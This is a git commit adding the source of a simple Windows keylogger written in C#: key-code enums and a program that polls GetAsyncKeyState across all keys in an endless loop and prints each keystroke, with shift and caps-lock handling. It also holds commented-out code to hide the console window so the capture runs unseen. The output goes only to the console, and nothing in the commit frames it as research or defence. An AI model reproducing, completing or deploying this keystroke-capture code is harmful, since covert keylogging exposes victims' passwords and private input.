fe7e5478d07e8d75bd3673f0fac5341dfed41634
Daniel Anjos <dmartins.anj@gmail.com>
2023-08-24 17:33:10 -0300

    First commit

---
+++ Keylogger/Keys.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Keylogger
+{
+    public enum Keys
+    {
+        LShift = 16,
+        LDShift = 160,
+        RShift = 161,
+        CapsLock = 20,
+        Alt = 18,
+        DAlt = 164,
+        BarSymbol = 193
+    }
+
+    public enum ShiftKeys
+    {
+        LShift = 16,
+        LDShift = 160,
+        RShift = 161,
+        ShiftZero = 48,
+        ShiftOne= 49,
+        ShiftTwo = 50,
+        ShiftThree = 51,
+        ShiftFour = 52,
+        ShiftFive = 53,
+        ShiftSix = 54,
+        ShiftSeven = 55,
+        ShiftEight = 56,
+        ShiftNine = 57,
+        InterrogationSymbol = 193
+    }
+}
---
+++ Keylogger/Program.cs
@@ -0,0 +1,83 @@
+﻿using Keylogger;
+using System;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+
+internal class Program
+{
+
+    [DllImport("User32.dll")]
+    public static extern int GetAsyncKeyState(Int32 i);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    private static void Main(string[] args)
+    {
+        new Program().start();
+    }
+
+    private void start()
+    {
+        bool shift = false;
+
+        //hide window
+        //var handle = GetConsoleWindow();
+        //ShowWindow(handle, 0);
+
+        //monitoring keys
+        while (true)
+        {
+            shift = false;
+
+            for (int i = 0; i < 255; i++)
+            {
+                int KeyState = GetAsyncKeyState(i);
+                if (KeyState == 32769)
+                {
+                    int shiftState = GetAsyncKeyState(16);
+
+                    if (shiftState == 32768 || shiftState == 32769)
+                    {
+                        shift = true;
+                    }
+
+                    string keyValue = GetStringFromEnum(i, shift);
+
+                    Console.WriteLine(keyValue);
+                }
+            }
+        }
+    }
+
+    private string GetStringFromEnum(int i, bool shift)
+    {
+        string keyValue = ((ConsoleKey)i).ToString();
+
+        if (!Enum.IsDefined(typeof(ConsoleKey), i) && (!shift && Enum.IsDefined(typeof(ShiftKeys), i)))
+        {
+            keyValue = ((Keys)i).ToString();
+        }
+
+        if (shift && Enum.IsDefined(typeof(ShiftKeys), i))
+        {
+            keyValue = ((ShiftKeys)i).ToString();
+        }
+
+        if ((!shift && !Console.CapsLock) || (Console.CapsLock && shift))
+        {
+            return keyValue.ToLower();
+        }
+
+        if ((shift || Console.CapsLock) && !(Console.CapsLock && shift))
+        {
+            return keyValue.ToUpper();
+        }
+
+        return keyValue;
+    }
+}
